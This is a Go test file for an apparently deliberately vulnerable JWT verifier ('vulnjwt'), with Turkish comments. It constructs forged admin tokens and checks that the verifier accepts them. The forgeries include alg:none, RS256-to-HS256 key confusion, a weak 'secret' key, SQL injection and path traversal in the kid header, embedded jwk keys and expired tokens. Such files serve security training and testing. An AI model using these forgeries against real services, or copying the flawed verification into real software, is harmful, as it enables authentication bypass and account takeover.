package vulnjwt

import (
	"crypto"
	"crypto/hmac"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"testing"
)

func b64(m map[string]interface{}) string {
	b, _ := json.Marshal(m)
	return base64.RawURLEncoding.EncodeToString(b)
}

func hs256(header, payload map[string]interface{}, key []byte) string {
	si := b64(header) + "." + b64(payload)
	mac := hmac.New(sha256.New, key)
	mac.Write([]byte(si))
	return si + "." + base64.RawURLEncoding.EncodeToString(mac.Sum(nil))
}

func TestVulnVectors(t *testing.T) {
	InitKeys()

	baseline, err := IssueBaselineToken("attacker@secman.io", "attacker@secman.io", "user")
	if err != nil {
		t.Fatalf("issue: %v", err)
	}

	// Baseline RS256 -> KABUL
	if _, err := VerifyVulnerable(baseline); err != nil {
		t.Fatalf("baseline reddedildi: %v", err)
	}

	// Negative control: RS256 imzayı boz -> RET
	bad := baseline[:len(baseline)-4] + "AAAA"
	if _, err := VerifyVulnerable(bad); err == nil {
		t.Fatalf("negative control KABUL edildi (olmamalı)")
	}

	payload := map[string]interface{}{"sub": "victim@secman.io", "role": "admin"}

	// VULN-01 alg:none
	none := b64(map[string]interface{}{"alg": "none", "typ": "JWT"}) + "." + b64(payload) + "."
	if _, err := VerifyVulnerable(none); err != nil {
		t.Errorf("VULN-01 alg:none reddedildi: %v", err)
	}

	// VULN-03 algorithm confusion: RSA public PEM'i HMAC secret olarak kullan
	conf := hs256(map[string]interface{}{"alg": "HS256", "typ": "JWT"}, payload, PublicPEM())
	if _, err := VerifyVulnerable(conf); err != nil {
		t.Errorf("VULN-03 algorithm confusion reddedildi: %v", err)
	}

	// VULN-03b weak HMAC secret
	weak := hs256(map[string]interface{}{"alg": "HS256", "typ": "JWT"}, payload, []byte("secret"))
	if _, err := VerifyVulnerable(weak); err != nil {
		t.Errorf("VULN-03b weak hmac reddedildi: %v", err)
	}

	// VULN-04b kid SQLi -> saldırgan anahtarı
	kidSQLi := hs256(
		map[string]interface{}{"alg": "HS256", "kid": "x' UNION SELECT 'attacker_secret' --", "typ": "JWT"},
		payload, []byte("attacker_secret"))
	if _, err := VerifyVulnerable(kidSQLi); err != nil {
		t.Errorf("VULN-04b kid sqli reddedildi: %v", err)
	}

	// VULN-04a kid path traversal -> boş anahtar
	kidPath := hs256(
		map[string]interface{}{"alg": "HS256", "kid": "../../../dev/null", "typ": "JWT"},
		payload, []byte(""))
	if _, err := VerifyVulnerable(kidPath); err != nil {
		t.Errorf("VULN-04a kid empty-key reddedildi: %v", err)
	}

	// VULN-04c kid-as-key
	kidAsKey := hs256(
		map[string]interface{}{"alg": "HS256", "kid": "known-kid-value", "typ": "JWT"},
		payload, []byte("known-kid-value"))
	if _, err := VerifyVulnerable(kidAsKey); err != nil {
		t.Errorf("VULN-04c kid-as-key reddedildi: %v", err)
	}

	// VULN-05 embedded jwk forgery
	atkKey, _ := rsa.GenerateKey(rand.Reader, 2048)
	nB := base64.RawURLEncoding.EncodeToString(atkKey.PublicKey.N.Bytes())
	jwkHeader := map[string]interface{}{
		"alg": "RS256", "typ": "JWT",
		"jwk": map[string]interface{}{"kty": "RSA", "n": nB, "e": "AQAB"},
	}
	si := b64(jwkHeader) + "." + b64(payload)
	h := sha256.Sum256([]byte(si))
	sig, _ := rsa.SignPKCS1v15(rand.Reader, atkKey, crypto.SHA256, h[:])
	jwkTok := si + "." + base64.RawURLEncoding.EncodeToString(sig)
	if _, err := VerifyVulnerable(jwkTok); err != nil {
		t.Errorf("VULN-05 embedded jwk reddedildi: %v", err)
	}

	// VULN-07 expired token (geçerli imza, geçmiş exp) -> yine kabul
	expired := map[string]interface{}{"sub": "attacker@secman.io", "role": "user", "exp": 1000000000}
	eb, _ := json.Marshal(map[string]interface{}{"alg": "RS256", "typ": "JWT"})
	pb, _ := json.Marshal(expired)
	esi := base64.RawURLEncoding.EncodeToString(eb) + "." + base64.RawURLEncoding.EncodeToString(pb)
	eh := sha256.Sum256([]byte(esi))
	esig, _ := rsa.SignPKCS1v15(rand.Reader, serverPrivateKey, crypto.SHA256, eh[:])
	if _, err := VerifyVulnerable(esi + "." + base64.RawURLEncoding.EncodeToString(esig)); err != nil {
		t.Errorf("VULN-07 expired token reddedildi: %v", err)
	}
}
